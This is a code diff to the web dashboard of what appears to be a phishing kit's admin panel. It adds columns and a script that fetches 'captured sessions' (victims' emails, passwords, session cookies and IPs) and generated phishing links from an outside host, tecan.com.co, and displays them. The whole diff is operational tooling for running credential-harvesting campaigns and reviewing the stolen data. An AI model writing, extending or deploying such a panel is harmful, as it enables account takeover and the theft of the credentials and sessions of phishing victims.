@@ -32,6 +32,7 @@
           <th>Password</th>
           <th>Cookies</th>
           <th>IP</th>
+          <th>Timestamp</th>
         </tr>
       </thead>
       <tbody id="capturedSessions">
@@ -43,8 +44,9 @@
     <table>
       <thead>
         <tr>
+          <th>Phishlet</th>
           <th>URL</th>
-          <th>Clicked Location</th>
+          <th>Timestamp</th>
           <th>IP Address</th>
         </tr>
       </thead>
@@ -53,5 +55,49 @@
       </tbody>
     </table>
   </div>
+
+  <script>
+    // Fetch and display generated links
+    function viewGeneratedLinks() {
+      fetch("https://tecan.com.co/generated_links_history")
+        .then(response => response.json())
+        .then(data => {
+          const tableBody = document.getElementById("generatedLinks");
+          tableBody.innerHTML = ""; // Clear previous data
+          data.forEach(link => {
+            const row = `<tr>
+              <td>${link.phishlet}</td>
+              <td><a href="${link.link}" target="_blank">${link.link}</a></td>
+              <td>${link.timestamp}</td>
+              <td>${link.ip}</td>
+            </tr>`;
+            tableBody.innerHTML += row;
+          });
+        })
+        .catch(error => console.error("Error fetching generated links:", error));
+    }
+
+    // Fetch and display captured sessions
+    function viewCapturedSessions() {
+      fetch("https://tecan.com.co/captured_sessions")
+        .then(response => response.json())
+        .then(data => {
+          const tableBody = document.getElementById("capturedSessions");
+          tableBody.innerHTML = ""; // Clear previous data
+          data.forEach(session => {
+            const row = `<tr>
+              <td>${session.email}</td>
+              <td>${session.password}</td>
+              <td>${session.cookies}</td>
+              <td>${session.ip}</td>
+              <td>${session.timestamp}</td>
+            </tr>`;
+            tableBody.innerHTML += row;
+          });
+        })
+        .catch(error => console.error("Error fetching captured sessions:", error));
+    }
+  </script>
 </body>
 </html>
+
